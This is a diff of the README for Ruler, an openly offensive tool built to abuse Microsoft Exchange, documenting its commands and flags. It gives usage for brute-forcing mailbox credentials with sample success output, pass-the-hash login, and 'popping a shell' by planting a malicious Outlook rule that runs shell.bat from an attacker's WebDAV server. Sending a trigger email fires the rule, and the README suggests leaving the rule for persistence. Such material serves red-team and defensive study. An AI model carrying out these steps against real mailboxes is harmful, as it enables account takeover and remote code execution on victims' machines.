@@ -57,7 +57,7 @@ Compiled binaries for Linux, OSX and Windows are available. Find these in [Relea
 
 # Interacting with Exchange
 
-~~It is important to note that for now this only works with the newer MAPI/HTTP used for OutlookAnywhere. The older RPC/HTTP which MAPI replaces is not supported and may possibly not be supported.~~ RPC/HTTP support has also been included, with Ruler favouring MAPI/HTTP. If MAPI/HTTP fails, an attempt will be made to use RPC/HTTP. You can also force RPC/HTTP by supplying the ```--rpc``` flag.
+Ruler works with both RPC/HTTP and MAPI/HTTP. Ruler favours MAPI/HTTP as this is the default in Exchange 2016 and Office365 deployments. If MAPI/HTTP fails, an attempt will be made to use RPC/HTTP. You can also force RPC/HTTP by supplying the ```--rpc``` flag.
 
 As mentioned before there are multiple functions to Ruler. In most cases you'll want to first find a set of valid credentials. Do this however you wish, Phishing, Wifi+Mana or brute-force.
 
@@ -69,6 +69,7 @@ Ruler has 5 basic commands, these are:
 * add -- add a rule
 * delete -- delete a rule
 * brute -- brute force credentials
+* send -- send an email to trigger the shell
 * help -- show the help screen
 
 There are a few global flags that should be used with most commands, while each command has sub-flags. For details on these, use the **help** command.
@@ -78,10 +79,10 @@ NAME:
    ruler - A tool to abuse Exchange Services
 
 USAGE:
-   ruler [global options] command [command options] [arguments...]
+   ruler-linux64 [global options] command [command options] [arguments...]
 
 VERSION:
-   2.0
+   2.0.17
 
 DESCRIPTION:
             _
@@ -90,35 +91,40 @@ DESCRIPTION:
 | |  | |_| | |  __/ |
 |_|   \__,_|_|\___|_|
 
-A tool by @sensepost to abuse Exchange Services.
+A tool by @_staaldraad from @sensepost to abuse Exchange Services.
 
 AUTHOR:
-   Etienne Stalmans <etienne@sensepost.com>
+   Etienne Stalmans <etienne@sensepost.com>, @_staaldraad
 
 COMMANDS:
-     add, a      add a new rule
-     delete, r   delete an existing rule
-     display, d  display all existing rules
-     check, c    Check if the credentials work and we can interact with the mailbox
-     brute, b    Do a bruteforce attack against the autodiscover service to find valid username/passwords
-     abk         Interact with the Global Address Book
-     help, h     Shows a list of commands or help for one command
+     add, a       add a new rule
+     delete, r    delete an existing rule
+     display, d   display all existing rules
+     check, c     Check if the credentials work and we can interact with the mailbox
+     send, s      Send an email to trigger an existing rule. This uses the target user's own account.
+     brute, b     Do a bruteforce attack against the autodiscover service to find valid username/passwords
+     abk          Interact with the Global Address Book
+     troopers, t  Troopers
+     help, h      Shows a list of commands or help for one command
 
 GLOBAL OPTIONS:
-    --domain value, -d value    A domain for the user (usually required for domain\username)
-    --username value, -u value  A valid username
-    --password value, -p value  A valid password
-    --hash value                A NT hash for pass the hash (NTLMv1)
-    --email value, -e value     The target's email address
-    --url value                 If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml
-    --insecure, -k              Ignore server SSL certificate errors
-    --encrypt                   Use NTLM auth on the RPC level - some environments require this
-    --basic, -b                 Force Basic authentication
-    --admin                     Login as an admin
-    --rpc                       Force RPC/HTTP rather than MAPI/HTTP
-    --verbose                   Be verbose and show some of thei inner workings
-    --help, -h                  show help
-    --version, -v               print the version
+   --domain value, -d value    A domain for the user (optional in most cases. Otherwise allows: domain\username)
+   --o365                      We know the target is on Office365, so authenticate directly against that.
+   --username value, -u value  A valid username
+   --password value, -p value  A valid password
+   --hash value                A NT hash for pass the hash
+   --email value, -e value     The target's email address
+   --cookie value              Any third party cookies such as SSO that are needed
+   --url value                 If you know the Autodiscover URL or the autodiscover service is failing. Requires full URI, https://autodisc.d.com/autodiscover/autodiscover.xml
+   --insecure, -k              Ignore server SSL certificate errors
+   --encrypt                   Use NTLM auth on the RPC level - some environments require this
+   --basic, -b                 Force Basic authentication
+   --admin                     Login as an admin
+   --nocache                   Don't use the cached autodiscover record
+   --rpc                       Force RPC/HTTP rather than MAPI/HTTP
+   --verbose                   Be verbose and show some of thei inner workings
+   --help, -h                  show help
+   --version, -v               print the version
 ```
 
 ## Brute-force for credentials
@@ -148,12 +154,6 @@ You should see your brute-force in action:
 [*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
 [x] Failed: henry.hammond:Password1
 [+] Success: cindy.baker:Password1
-[x] Failed: henry.hammond:Password!2016
-[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
-[x] Failed: henry.hammond:SensePost1
-[x] Failed: henry.hammond:Lekker
-[*] Multiple attempts. To prevent lockout - delaying for 0 minutes.
-[x] Failed: henry.hammond:Eish
 ```
 
 Alternatively, you can specify a userpass file with the ```--userpass``` option. The userpass file should be colon-delimited with one pair of credentials per line:
@@ -189,7 +189,9 @@ While Ruler makes a best effort to "autodiscover" the necessary settings, you ma
 
 If you encounter an Exchange server where the Autodiscover service is failing, you can manually specify the Autodiscover URL:
 
-``` ./ruler --url http://autodiscover.somedomain.com/autodiscover/autodiscover.xml ```
+```
+./ruler --url http://autodiscover.somedomain.com/autodiscover/autodiscover.xml
+```
 
 If you run into issues with Authentication (and you know the creds are correct), you can try and force the use of basic authentication with the global ```--basic```
 
@@ -218,9 +220,9 @@ Once you have a set of credentials you can target the user's mailbox. Here you'l
 ```
 
 Output:
+
 ```
 ./ruler  --username john.ford --password August2016 --email john.ford@evilcorp.ninja display
-
 [*] Retrieving MAPI info
 [*] Doing Autodiscover for domain
 [+] MAPI URL found:  https://mail.evilcorp.ninja/mapi/emsmdb/?MailboxId=7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja
@@ -230,15 +232,19 @@ Output:
 [*] Openning the Inbox
 [+] Retrieving Rules
 [+] Found 0 rules
-
 ```
 
 ## Delete existing rules (clean up after  yourself)
-To delete rules, use the ruleId displayed next to the rule name (000000df1)
+To delete rules, use either the ruleId displayed next to the rule name (000000df1), or the rule name. You will be prompted to verify the rule being deleted if you supply only the name.
 
 ```
-./ruler --email user@targetdomain.com --username username --password password delete --id 000000df1
+./ruler --email user@targetdomain.com --username username delete --id 000000df1
 ```
+
+```
+./ruler --email user@targetdomain.com --username username delete --name myrule
+```
+
 
 # Popping a shell
 
@@ -247,7 +253,7 @@ Now the fun part. Your initial setup is the same as outlined in the [Silentbreak
 To create the new rule user Ruler and:
 
 ```
-./ruler --email user@targetdomain.com --username username --password password add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
+./ruler --email user@targetdomain.com --username username add --location "\\\\yourserver\\webdav\\shell.bat" --trigger "pop a shell" --name maliciousrule
 ```
 
 The various parts:
@@ -277,15 +283,10 @@ You should now be able to send an email to your target with the trigger string i
 
 If you want to automate the triggering of the rule, Ruler is able to create a new message in the user's inbox, using their own email address. This means you no longer need to send an email to your target. Simply use the ```--send``` flag when creating your rule, and Ruler will wait 30seconds for your rules to synchronise (adjust this in the source if you think 30s is too long/short) and then send an email via MAPI.
 
+To customise the email sent with the ```--send``` flag, you can use ```--subject``` to specify a custom subject (remember to include your trigger word in the subject). Customise the body with ```--body```
+
 ```
-[*] Retrieving MAPI/HTTP info
-[*] Doing Autodiscover for domain
-[*] Autodiscover step 0 - URL: https://outlook.com/autodiscover/autodiscover.xml
-[+] MAPI URL found:  https://outlook.office365.com/mapi/emsmdb/?MailboxId=0003bffd-fef9-fb24-0000-000000000000@outlook.com
-[+] User DN:  /o=First Organization/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=0003BFFDFEF9FB24
-[*] Got Context, Doing ROPLogin
-[*] And we are authenticated
-[*] Openning the Inbox
+...
 [*] Adding Rule
 [*] Rule Added. Fetching list of rules...
 [+] Found 1 rules
@@ -296,13 +297,16 @@ Rule: autopop RuleID: 010000000c4baa84
 [*] And disconnecting from server
 ```
 
+If you want to send the email manually, using the targets own email address, you can also call the ```send``` command directly.
+
+```
+./ruler --email user@targetdomain.com send --subject test --body "this is a test"
+```
+
 Enjoy your shell and don't forget to clean-up after yourself by deleting the rule (or leave it for persistence).
 
-## A note about RPC
-
-RPC/HTTP usually works through a RPC/HTTP proxy, this requires NTLM authentication. By default, Ruler takes care of this. There is however the option to have additional security enabled for Exchange, where Encryption and Integrity checking is enabled on RPC. This requires addional auth to happen on the RPC layer (inside the already NTLM authenticated HTTP channel). To force this, use the ```--encrypt``` flag. Ruler will try and warn you that this is required, if it is able to detect an issue. Alternatively just use this flag when in doubt.
 
 [Silentbreak blog]: <https://silentbreaksecurity.com/malicious-outlook-rules/>
 [SensePost blog]: <https://sensepost.com/blog/2016/mapi-over-http-and-mailrule-pwnage/>
-[Ruler on YouTube]:<https://www.youtube.com/watch?v=Epk28fEw2Vk>
+[Ruler on YouTube]:<https://youtu.be/C07GS4M8BZk>
 [Releases]: <https://github.com/sensepost/ruler/releases>
